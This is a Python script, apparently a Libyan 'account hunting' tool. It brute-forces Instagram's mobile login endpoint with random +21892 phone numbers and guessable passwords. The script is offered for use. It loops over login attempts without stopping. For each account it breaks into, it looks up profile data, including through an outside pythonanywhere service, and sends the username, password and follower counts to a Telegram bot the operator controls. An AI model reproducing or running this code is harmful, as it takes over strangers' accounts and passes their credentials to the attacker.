
import os
os.system('clear')
try:
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
except ImportError:
    os.system('pip install time')
    os.system('pip install webbrowser ')
    os.system('pip install random')
    os.system('pip install requests')
    os.system('pip install user_agent')
    os.system('pip install json')
    os.system('pip install secrets')
    os.system('pip install sys')
    os.system('clear')
    from time import sleep
    import time, webbrowser, random, requests
    from uuid import uuid4
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
else:
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
    os.system('clear')
    aa = 0
    zz = 0
    E = '\x1b[1;31m'
    G = '\x1b[1;32m'
    S = '\x1b[1;33m'
    Z = '\x1b[1;31m'
    X = '\x1b[1;33m'
    Z1 = '\x1b[2;31m'
    F = '\x1b[2;32m'
    A = '\x1b[2;39m'
    C = '\x1b[2;35m'
    B = '\x1b[2;36m'
    Y = '\x1b[1;34m'
    import time
    timee = time.asctime()
    t = time.localtime()
    current_time = time.strftime('%H:%M:%S', t)

    def a(z):
        for e in z:
            sys.stdout.write(e)
            sys.stdout.flush()
            sleep(0.1)


    a(f"     سيرجو فنص الاداة 🖐️✔️    {Y}by{G}: se._.raj_m7")
    sleep(1)
    print('\n\n')
    a(G + ' \n\nTOKN ')
    print('\n')
    tok = input(S + '     >> ' + C)
    sleep(1)
    os.system('clear')
    a(A + ' ID ')
    print('\n')
    ID = input(A + '     >> ' + C)
    sleep(0.1)
    os.system('clear')
    start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=صيد بواسطةة سيرجوو ❤️🇱🇾s").json()
    id_msg = start_msg['result']['message_id']

    def code_joo(userQ, password):
        cookie = secrets.token_hex(8) * 2
        head = {'HOST':'www.instagram.com', 
         'KeepAlive':'True', 
         'user-agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:50.0) Gecko/20100101 Firefox/50.0', 
         'Cookie':cookie, 
         'Accept':'*/*', 
         'ContentType':'application/x-www-form-urlencoded', 
         'X-Requested-With':'XMLHttpRequest', 
         'X-IG-App-ID':'936619743392459', 
         'X-Instagram-AJAX':'missing', 
         'X-CSRFToken':'missing', 
         'Accept-Language':'en-US,en;q=0.9'}
        url_id = f"https://www.instagram.com/{userQ}/?__a=1"
        req_id = requests.get(url_id, headers=head).json()
        name = str(req_id['graphql']['user']['full_name'])
        id = str(req_id['graphql']['user']['id'])
        followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
        following = str(req_id['graphql']['user']['edge_follow']['count'])
        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
        ree = re.json()
        dat = ree['data']
        t = time.localtime()
        current_time = time.strftime('%H:%M:%S', t)
        joo3 = f"  ⌯ خشي شدت في حساب حساب✔️✔️✔️✔️✔️ الاسم   : {name}\n .اليوزر: {userQ}\n .. الرمز  : {password}\n .. المتابعين🇱🇾��������️ : {followes}\n .. المتابعهم��������️ : {following}\n .. تاريـخ : {dat}\n .. الوقت🇱🇾 : {current_time}\n عدد الحسابات الي صايدهن  [{zz}] \n ︎.<•>︎  المطور ~~~~ @CC_X18ss.\n..   :@CC_X18s \n"
        tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=\n {joo3} \n"
        i = requests.post(tlg)
        print(G + joo3)


    url = 'https://b.i.instagram.com/api/v1/accounts/login/'
    headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
    
    print(G + 'احبكم ♥😘  ')
    sleep(0)
    user = '0987654321'
    while True:
        us = str(''.join((random.choice(user) for i in range(7))))
        username = '+21892' + us
        password = '092' + us
        from uuid import uuid4
        uid = str(uuid4())
        data = {'uuid':uid, 
         'password':password, 
         'username':username, 
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
        req = requests.post(url, headers=headers, data=data)
        if 'logged_in_user' in req.json():
            zz += 1
            userQ = req.json()['logged_in_user']['username']
            code_joo(userQ, password)
        elif '"message":"challenge_required","challenge"' in req.json():
            print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
        else:
            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=\n\n⌯ ⌯ انتضر صيد يجيك سطة سيرجو 🇱🇾❤️وانية @w7_3s\n->•✔️\n√| @w7_3s|√\
  \n->• Hunted✔️ [{zz}]\n->•\u200aNot hunted❌ [{aa}]")
            print(E + 'username ==> : ' + username + ': password ==> : ' + password)
            aa += 1
